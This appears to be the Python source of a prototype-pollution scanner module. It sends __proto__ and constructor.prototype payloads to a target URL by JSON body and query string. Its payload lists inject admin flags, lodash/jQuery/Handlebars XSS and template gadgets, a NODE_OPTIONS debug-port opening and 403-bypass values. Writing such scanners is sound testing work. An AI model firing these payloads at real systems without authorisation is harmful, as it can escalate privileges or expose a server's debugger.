"""
websecure.scanners.prototype_pollution
----------------------------------------
JavaScript Prototype Pollution vulnerability detector.

Techniques
----------
  1. JSON body injection  — POST/PUT with __proto__, constructor.prototype keys
  2. Query-string pollution — ?__proto__[x]=1, ?constructor[prototype][x]=1
  3. Deep-merge sink probe  — nested JSON objects that trigger polluted keys
  4. Reflected-property check — response body searched for canary value
  5. Server-side PP — Node.js admin property injection + stack trace detection
  6. Gadget detection — lodash/jQuery/Handlebars known gadget payloads
  7. PP-to-chain — status code bypass, template injection, env pollution

References
----------
  • https://portswigger.net/web-security/prototype-pollution
  • https://github.com/nicehash/node-prototype-pollution-test
"""
from __future__ import annotations

import json
import logging
import random
import re
import string
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from websecure.scanners.base import BaseScanner
from websecure.core.http import hardened_session

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Canary value — unique per scan run
# ---------------------------------------------------------------------------
def _canary() -> str:
    return "wsp_" + "".join(random.choices(string.ascii_lowercase, k=8))


# ---------------------------------------------------------------------------
# JSON body payloads
# ---------------------------------------------------------------------------
def _json_payloads(canary: str) -> List[Dict[str, Any]]:
    """Return a list of JSON bodies that attempt prototype pollution."""
    return [
        # Direct __proto__ key
        {"__proto__": {"polluted": canary}},

        # constructor.prototype path
        {"constructor": {"prototype": {"polluted": canary}}},

        # Nested merge target
        {"a": {"__proto__": {"polluted": canary}}},

        # Array-like deep merge
        {"__proto__": {"polluted": canary, "toString": canary}},

        # Lodash-style deep clone target
        {"level1": {"level2": {"__proto__": {"polluted": canary}}}},

        # Unicode key variant (__proto__ with zero-width space)
        {"\u200b__proto__\u200b": {"polluted": canary}},

        # Numeric prototype pollution
        {"__proto__": {"0": canary, "length": 1}},

        # constructor chain
        {"constructor": {"prototype": {"constructor": {"prototype": {"polluted": canary}}}}},
    ]


# ---------------------------------------------------------------------------
# Query-string payloads
# ---------------------------------------------------------------------------
_QS_TEMPLATES: List[str] = [
    "__proto__[polluted]={c}",
    "__proto__.polluted={c}",
    "constructor[prototype][polluted]={c}",
    "constructor.prototype.polluted={c}",
    "__proto__[toString]={c}",
    "a[__proto__][polluted]={c}",
    "a.__proto__.polluted={c}",
    "obj[__proto__][polluted]={c}",
    # URL-encoded variants
    "%5B__proto__%5D%5Bpolluted%5D={c}",
    "constructor%5Bprototype%5D%5Bpolluted%5D={c}",
]


def _qs_payloads(base_url: str, canary: str) -> List[str]:
    """Return URLs with prototype-pollution query strings appended."""
    sep = "&" if "?" in base_url else "?"
    urls = []
    for tmpl in _QS_TEMPLATES:
        param = tmpl.format(c=urllib.parse.quote(canary, safe=""))
        urls.append(base_url + sep + param)
    return urls


# ---------------------------------------------------------------------------
# Response analysis
# ---------------------------------------------------------------------------
def _canary_in_response(resp, canary: str) -> bool:
    """Return True if the canary appears in the response text."""
    try:
        text = resp.text if hasattr(resp, "text") else resp.content.decode("utf-8", "replace")
        return canary in text
    except Exception as exc:
        return False


def _build_finding(technique: str, url: str, payload: Any, canary: str) -> Dict[str, Any]:
    return {
        "type": "Prototype Pollution",
        "technique": technique,
        "url": url,
        "severity": "High",
        "description": (
            f"Prototype pollution candidate detected via {technique}. "
            f"Canary value '{canary}' was reflected in the response, indicating "
            "the injected __proto__ property may have been merged into a shared object."
        ),
        "evidence": {
            "payload": str(payload)[:300],
            "canary": canary,
        },
    }


# ---------------------------------------------------------------------------
# Advanced Probers — Server-Side PP, Gadgets, PP-to-Chain
# ---------------------------------------------------------------------------

class ServerSidePPProber(BaseScanner):
    """
    Server-side prototype pollution prober for Node.js/Express applications.
    Injects admin/isAdmin properties via __proto__ and constructor.prototype,
    both in JSON body and query string, then checks for reflection or stack traces.
    Single Responsibility: server-side PP detection only.
    """

    name = "pp_server_side"

    _SSPP_JSON_PAYLOADS: List[Dict[str, Any]] = [
        {"__proto__": {"admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"isAdmin": True, "role": "admin"}},
        {"__proto__": {"admin": True, "superuser": True}},
        {"constructor": {"prototype": {"isAdmin": True, "privileged": True}}},
    ]

    _QS_SSPP_TEMPLATES: List[str] = [
        "__proto__[admin]=true",
        "__proto__[isAdmin]=true",
        "constructor[prototype][admin]=true",
        "constructor[prototype][isAdmin]=true",
        "__proto__[role]=admin",
    ]

    _STACK_TRACE_PATTERNS = [
        r"at\s+\w+\s+\(.*\.js:\d+",     # Node.js stack frame
        r"express[/ ]\d+\.\d+",          # Express version leak
        r"node[/ ]\d+\.\d+",             # Node version leak
        r"TypeError:.*prototype",        # PP-related type error
        r"RangeError.*Maximum call",     # Stack overflow from pollution
    ]

    def run(self, target: str, **kwargs) -> None:
        # -- JSON body injection -----------------------------------------------
        for payload in self._SSPP_JSON_PAYLOADS:
            for method in ("POST", "PUT", "PATCH"):
                try:
                    resp = self.session.request(
                        method,
                        target,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                        allow_redirects=True,
                    )
                    text = resp.text or ""
                    # Check for reflected admin/isAdmin
                    if re.search(r'"admin"\s*:\s*true', text, re.I) or re.search(
                        r'"isAdmin"\s*:\s*true', text, re.I
                    ) or re.search(r'"role"\s*:\s*"admin"', text, re.I):
                        self.report_finding(
                            vuln_type="Server-Side Prototype Pollution (Admin Reflection)",
                            url=target,
                            param=f"[JSON body {method}]",
                            payload=json.dumps(payload),
                            severity="Critical",
                            evidence=(
                                f"__proto__ admin property reflected in {method} response. "
                                f"Payload: {json.dumps(payload)[:200]}"
                            ),
                        )
                        return

                    # Check for Node.js/Express stack trace (info leak)
                    for pat in self._STACK_TRACE_PATTERNS:
                        if re.search(pat, text, re.I | re.S):
                            self.report_finding(
                                vuln_type="Server-Side Prototype Pollution (Stack Trace Leak)",
                                url=target,
                                param=f"[JSON body {method}]",
                                payload=json.dumps(payload),
                                severity="Medium",
                                evidence=(
                                    f"Node.js/Express stack trace or version revealed "
                                    f"via prototype pollution probe ({method}). Pattern: {pat}"
                                ),
                            )
                            break

                except Exception as exc:
                    logger.debug("[ServerSidePPProber] JSON %s error: %s", method, exc)

        # -- Query-string injection ---------------------------------------------
        sep = "&" if "?" in target else "?"
        for qs_param in self._QS_SSPP_TEMPLATES:
            test_url = target + sep + qs_param
            try:
                resp = self.session.get(test_url, timeout=10, allow_redirects=True)
                text = resp.text or ""
                if re.search(r'"admin"\s*:\s*true', text, re.I) or re.search(
                    r'"isAdmin"\s*:\s*true', text, re.I
                ):
                    self.report_finding(
                        vuln_type="Server-Side Prototype Pollution (QS Admin Reflection)",
                        url=target,
                        param=f"[Query: {qs_param}]",
                        payload=qs_param,
                        severity="Critical",
                        evidence=(
                            f"__proto__ admin property reflected via query string. "
                            f"Param: {qs_param}"
                        ),
                    )
                    return
            except Exception as exc:
                logger.debug("[ServerSidePPProber] QS error: %s", exc)


class PPGadgetScanner(BaseScanner):
    """
    Prototype pollution gadget detector.
    Probes for known vulnerable library patterns (lodash, jQuery, Handlebars)
    that can turn prototype pollution into XSS or SSTI chains.
    Single Responsibility: gadget-chain detection only.
    """

    name = "pp_gadget"

    # (payload, library_name, check_pattern, check_description)
    _GADGET_PAYLOADS: List[Tuple] = [
        (
            {"__proto__": {"sourceURL": "\nalert(1)"}},
            "lodash",
            r"alert\(1\)",
            "lodash sourceURL gadget — XSS chain",
        ),
        (
            {"__proto__": {"url": "javascript:alert(1)"}},
            "jQuery",
            r"javascript:alert\(1\)",
            "jQuery url gadget — XSS chain",
        ),
        (
            {"__proto__": {"pendingContent": "{{7*7}}"}},
            "Handlebars",
            r"49",
            "Handlebars pendingContent gadget — SSTI+PP chain",
        ),
        (
            {"__proto__": {"template": "{{7*7}}"}},
            "Handlebars/EJS",
            r"49",
            "Template engine gadget — SSTI+PP chain (7*7=49)",
        ),
        (
            {"constructor": {"prototype": {"pendingContent": "{{7*7}}"}}},
            "Handlebars (constructor path)",
            r"49",
            "Handlebars SSTI via constructor.prototype — PP chain",
        ),
    ]

    def run(self, target: str, **kwargs) -> None:
        for payload, library, check_pat, description in self._GADGET_PAYLOADS:
            for method in ("POST", "PUT", "PATCH"):
                try:
                    resp = self.session.request(
                        method,
                        target,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                        allow_redirects=True,
                    )
                    text = resp.text or ""
                    if re.search(check_pat, text, re.I | re.S):
                        is_ssti = "49" in check_pat or "7\\*7" in check_pat
                        vuln_label = (
                            "Prototype Pollution → SSTI Chain (Critical)"
                            if is_ssti
                            else "Prototype Pollution → XSS Chain (Critical)"
                        )
                        self.report_finding(
                            vuln_type=vuln_label,
                            url=target,
                            param=f"[JSON {method} — {library} gadget]",
                            payload=json.dumps(payload),
                            severity="Critical",
                            evidence=(
                                f"Gadget library: {library}. {description}. "
                                f"Pattern '{check_pat}' matched in response."
                            ),
                        )
                        break
                except Exception as exc:
                    logger.debug("[PPGadgetScanner] %s %s error: %s", library, method, exc)


class PPToPollutionChainProber(BaseScanner):
    """
    Prototype pollution to exploit chain prober.
    Tests PP-to-403-bypass, PP-to-template-injection, PP-to-debug-env
    and PP-to-option-injection chains.
    Single Responsibility: PP exploit chain detection only.
    """

    name = "pp_chain"

    _CHAIN_PAYLOADS: List[Tuple] = [
        (
            {"__proto__": {"status": 200}},
            "status_bypass",
            "PP → status code bypass: __proto__.status=200 may bypass 403 guards",
        ),
        (
            {"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0:1337"}},
            "option_injection",
            "PP → NODE_OPTIONS injection: debug port exposure attempt",
        ),
        (
            {"__proto__": {"layout": "main", "content": "{{7*7}}"}},
            "template_injection",
            "PP → template injection: layout+content gadget (7*7=49)",
        ),
        (
            {"__proto__": {"env": {"NODE_ENV": "development"}}},
            "env_pollution",
            "PP → env pollution: NODE_ENV=development may enable debug mode",
        ),
        (
            {"constructor": {"prototype": {"status": 200}}},
            "status_bypass_constructor",
            "PP → status code bypass via constructor.prototype path",
        ),
        (
            {"constructor": {"prototype": {"layout": "main", "content": "{{7*7}}"}}},
            "template_constructor",
            "PP → template injection via constructor.prototype path",
        ),
    ]

    def run(self, target: str, **kwargs) -> None:
        # Fetch baseline to detect status code and content changes
        try:
            baseline_resp = self.session.get(target, timeout=10, allow_redirects=True)
            baseline_status = baseline_resp.status_code
            baseline_text = baseline_resp.text or ""
        except Exception as exc:
            logger.debug("[PPToPollutionChainProber] baseline failed: %s", exc)
            return

        was_forbidden = baseline_status in (403, 401)

        for payload, chain_type, description in self._CHAIN_PAYLOADS:
            for method in ("POST", "PUT", "PATCH"):
                try:
                    resp = self.session.request(
                        method,
                        target,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                        allow_redirects=True,
                    )
                    text = resp.text or ""

                    # 403 bypass detection
                    if chain_type in ("status_bypass", "status_bypass_constructor"):
                        if was_forbidden and resp.status_code == 200:
                            self.report_finding(
                                vuln_type="Prototype Pollution → 403 Bypass",
                                url=target,
                                param=f"[JSON {method}]",
                                payload=json.dumps(payload),
                                severity="Critical",
                                evidence=(
                                    f"Status changed from {baseline_status} to 200 "
                                    f"after PP status injection. {description}"
                                ),
                            )
                            break

                    # Template injection detection (7*7 = 49)
                    if chain_type in ("template_injection", "template_constructor"):
                        if re.search(r"\b49\b", text) and "49" not in baseline_text:
                            self.report_finding(
                                vuln_type="Prototype Pollution → Template Injection (SSTI)",
                                url=target,
                                param=f"[JSON {method}]",
                                payload=json.dumps(payload),
                                severity="Critical",
                                evidence=(
                                    f"Template expression {{{{7*7}}}} evaluated to 49 "
                                    f"after PP chain injection. {description}"
                                ),
                            )
                            break

                    # NODE_OPTIONS / debug port — any response with inspect indicator
                    if chain_type == "option_injection":
                        if re.search(r"(?i)(debugger|inspect|9229|1337)", text):
                            self.report_finding(
                                vuln_type="Prototype Pollution → NODE_OPTIONS Injection",
                                url=target,
                                param=f"[JSON {method}]",
                                payload=json.dumps(payload),
                                severity="Critical",
                                evidence=(
                                    f"Node.js inspector/debug indicator found in response "
                                    f"after NODE_OPTIONS injection. {description}"
                                ),
                            )
                            break

                    # Env pollution: development mode signals
                    if chain_type == "env_pollution":
                        if re.search(r"(?i)(development|stack trace|error|debug)", text) and not re.search(
                            r"(?i)(development|stack trace|error|debug)", baseline_text
                        ):
                            self.report_finding(
                                vuln_type="Prototype Pollution → Debug Env Enabled",
                                url=target,
                                param=f"[JSON {method}]",
                                payload=json.dumps(payload),
                                severity="High",
                                evidence=(
                                    f"Development/debug indicators appeared in response "
                                    f"after NODE_ENV=development pollution. {description}"
                                ),
                            )
                            break

                except Exception as exc:
                    logger.debug("[PPToPollutionChainProber] %s %s error: %s", chain_type, method, exc)


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------
def run(
    url: str,
    session=None,
    debug: bool = False,
    auth_ctx: Any = None,
    results: Optional[Dict] = None,
    **_,
) -> List[Dict[str, Any]]:
    """
    Test *url* for prototype pollution vulnerabilities.

    Returns a list of finding dicts (may be empty).
    """
    if debug:
        logger.setLevel(logging.DEBUG)

    _results: Dict[str, Any] = results if results is not None else {}
    scan_results: List[Dict[str, Any]] = []
    canary = _canary()

    if session is None:
        session = hardened_session({})

    # -- 1. JSON body injection ----------------------------------------------
    for payload in _json_payloads(canary):
        for method in ("POST", "PUT", "PATCH"):
            try:
                resp = session.request(
                    method,
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                    allow_redirects=True,
                )
                if _canary_in_response(resp, canary):
                    scan_results.append(_build_finding(
                        f"JSON body ({method})", url, payload, canary
                    ))
                    logger.info("[ProtoPollution] JSON body hit on %s (%s)", url, method)
                    break  # One finding per technique is enough
            except Exception as exc:
                logger.debug("[ProtoPollution] JSON %s error: %s", method, exc)
        if scan_results:
            break  # Stop after first confirmed JSON finding

    # -- 2. Query-string injection -------------------------------------------
    if not scan_results:
        for test_url in _qs_payloads(url, canary):
            try:
                resp = session.get(test_url, timeout=10, allow_redirects=True)
                if _canary_in_response(resp, canary):
                    scan_results.append(_build_finding(
                        "Query-string parameter", test_url, test_url, canary
                    ))
                    logger.info("[ProtoPollution] QS hit: %s", test_url)
                    break
            except Exception as exc:
                logger.debug("[ProtoPollution] QS error: %s", exc)

    # -- 3. Deep-merge probe (JSON PATCH) -----------------------------------
    deep_payload = {
        "data": {
            "__proto__": {"polluted": canary},
            "constructor": {"prototype": {"polluted": canary}},
        }
    }
    try:
        resp = session.patch(
            url,
            json=deep_payload,
            headers={"Content-Type": "application/merge-patch+json"},
            timeout=10,
            allow_redirects=True,
        )
        if _canary_in_response(resp, canary):
            scan_results.append(_build_finding(
                "JSON PATCH deep-merge", url, deep_payload, canary
            ))
    except Exception as exc:
        logger.debug("[ProtoPollution] PATCH probe error: %s", exc)

    # -- 4. Server-side PP prober -------------------------------------------
    sspp_results: Dict[str, Any] = {}
    sspp = ServerSidePPProber(session=session, results=sspp_results, debug=debug)
    sspp.run(url)
    for finding in (sspp_results.get("offensive") or []):
        if finding not in scan_results:
            scan_results.append(finding)

    # -- 5. Gadget detection ------------------------------------------------
    gadget_results: Dict[str, Any] = {}
    gadget = PPGadgetScanner(session=session, results=gadget_results, debug=debug)
    gadget.run(url)
    for finding in (gadget_results.get("offensive") or []):
        if finding not in scan_results:
            scan_results.append(finding)

    # -- 6. PP-to-chain prober ----------------------------------------------
    chain_results: Dict[str, Any] = {}
    chain = PPToPollutionChainProber(session=session, results=chain_results, debug=debug)
    chain.run(url)
    for finding in (chain_results.get("offensive") or []):
        if finding not in scan_results:
            scan_results.append(finding)

    return scan_results
